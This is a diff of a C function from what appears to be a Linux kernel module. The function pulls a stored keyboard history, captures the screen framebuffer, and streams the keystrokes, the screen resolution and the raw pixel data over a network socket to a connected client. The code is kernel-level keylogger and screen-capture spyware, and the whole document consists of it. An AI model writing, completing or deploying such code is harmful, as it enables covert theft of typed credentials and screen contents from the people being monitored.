@@ -23,49 +23,41 @@ static struct task_struct *listener;
  */
 static void send_message(struct socket *conn)
 {
-	struct msghdr msg = { .msg_flags = 0 };
-
-	// the buffer with the rgb screen data
+	struct msghdr msg = { 0 };
 	struct frame_buffer fb;
 
-	// the buffer that will hold the x and y resolution
-	int *resolutionbuf;
-
-	// get the keyboard history buffer
-	char *keyboard = read_key_history();
-
-	// set the struct with the data to be sent and it's size
 	struct kvec iov = {
-		.iov_base = keyboard,
+		.iov_base = read_key_history(),
 		.iov_len = BUFFER_SIZE,
 	};
+	int b;
 
-	// send the keyboard data
-	kernel_sendmsg(conn, &msg, &iov, 0, sizeof(iov));
-	kfree(keyboard);
-
-	// get the screen data
 	record_frame_buffer(&fb);
 
-	// alloc the resolution buffer for the client to know the screen size
-	resolutionbuf = kmalloc(iov.iov_len, 0);
-	resolutionbuf[0] = fb.xres;
-	resolutionbuf[1] = fb.yres;
+	printk(KERN_INFO "sending keyboard data\n");
+	kernel_sendmsg(conn, &msg, &iov, 1, BUFFER_SIZE);
 
-	// overwrite iov with the new data
-	iov.iov_len = sizeof(int) * 2;
-	iov.iov_base = resolutionbuf;
+	((int *)iov.iov_base)[0] = fb.xres;
+	((int *)iov.iov_base)[1] = fb.yres;
 
-	// send the resolution data
-	kernel_sendmsg(conn, &msg, &iov, 0, sizeof(iov));
-	kfree(resolutionbuf);
+	printk(KERN_INFO "sending resolution\n");
+	kernel_sendmsg(conn, &msg, &iov, 1, sizeof(int)*2);
 
-	// overwrite iov with the new data
-	iov.iov_len = sizeof(char) * 4 * fb.xres * fb.yres;
-	iov.iov_base = fb.rgb_buffer;
+	printk(KERN_INFO "starting send pixel data\n");
+	for (b = 0; b < 3 * fb.xres * fb.yres; b += BUFFER_SIZE) {
+		memcpy(iov.iov_base, fb.rgb_buffer + b, BUFFER_SIZE);
+		kernel_sendmsg(conn, &msg, &iov, 1, BUFFER_SIZE);
+	}
+	printk(KERN_INFO "start sending padding data\n");
 
-	// send the screen pixels
-	kernel_sendmsg(conn, &msg, &iov, 0, sizeof(iov));
+	memcpy(iov.iov_base, fb.rgb_buffer,
+	       BUFFER_SIZE - ((3 * fb.xres * fb.yres) % BUFFER_SIZE));
+
+	kernel_sendmsg(conn, &msg, &iov, 1,
+		       BUFFER_SIZE - ((3 * fb.xres * fb.yres) % BUFFER_SIZE));
+
+	printk(KERN_INFO "done\n");
+
 	clean_frame_buffer(&fb);
 }
 
